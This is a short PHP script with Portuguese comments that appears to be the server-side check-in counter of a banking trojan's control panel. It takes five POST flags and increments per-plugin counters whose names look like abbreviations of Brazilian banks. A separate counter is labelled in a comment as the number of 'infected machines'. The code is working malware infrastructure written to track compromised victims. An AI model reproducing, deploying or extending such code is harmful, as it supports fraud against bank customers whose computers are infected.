<?php

if (isset($_POST["ID1"])) {
	if (isset($_POST["ID2"])) {
		if (isset($_POST["ID3"])) {
			if (isset($_POST["ID4"])) {
				if (isset($_POST["ID5"])) {
					
					/* Salva log de contagem dos plugins... */
					$BBX = $_POST["ID1"];
					$CEF = $_POST["ID2"];
					$ABN = $_POST["ID3"];
					$UNI = $_POST["ID4"];
					$SCP = $_POST["ID5"];
					
					if ($BBX == 1) {
						$arquivo = fopen("controles/plugins_bbx.txt", "r");
						$valor = fgets($arquivo, 1024);
						fclose($arquivo);
						
						$arquivo = fopen("controles/plugins_bbx.txt", "r+");
						$valor = $valor + 1;
						fwrite($arquivo, $valor);
						fclose($arquivo);
					}
					
					if ($CEF == 1) {
						$arquivo = fopen("controles/plugins_cef.txt", "r");
						$valor = fgets($arquivo, 1024);
						fclose($arquivo);
						
						$arquivo = fopen("controles/plugins_cef.txt", "r+");
						$valor = $valor + 1;
						fwrite($arquivo, $valor);
						fclose($arquivo);
					}
					
					if ($ABN == 1) {
						$arquivo = fopen("controles/plugins_abn.txt", "r");
						$valor = fgets($arquivo, 1024);
						fclose($arquivo);
						
						$arquivo = fopen("controles/plugins_abn.txt", "r+");
						$valor = $valor + 1;
						fwrite($arquivo, $valor);
						fclose($arquivo);
					}
					
					if ($UNI == 1) {
						$arquivo = fopen("controles/plugins_uni.txt", "r");
						$valor = fgets($arquivo, 1024);
						fclose($arquivo);
						
						$arquivo = fopen("controles/plugins_uni.txt", "r+");
						$valor = $valor + 1;
						fwrite($arquivo, $valor);
						fclose($arquivo);
					}
					
					if ($SCP == 1) {
						$arquivo = fopen("controles/plugins_scp.txt", "r");
						$valor = fgets($arquivo, 1024);
						fclose($arquivo);
						
						$arquivo = fopen("controles/plugins_scp.txt", "r+");
						$valor = $valor + 1;
						fwrite($arquivo, $valor);
						fclose($arquivo);
					}
					
					/* Quantidade de maquinas infectadas... */
					$arquivo = fopen("controles/maquinas_cn.txt", "r");
					$valor = fgets($arquivo, 1024);
					fclose($arquivo);
					
					$arquivo = fopen("controles/maquinas_cn.txt", "r+");
					$valor = $valor + 1;
					fwrite($arquivo, $valor);
					fclose($arquivo);
					
				}
			}
		}
	}
}

?>
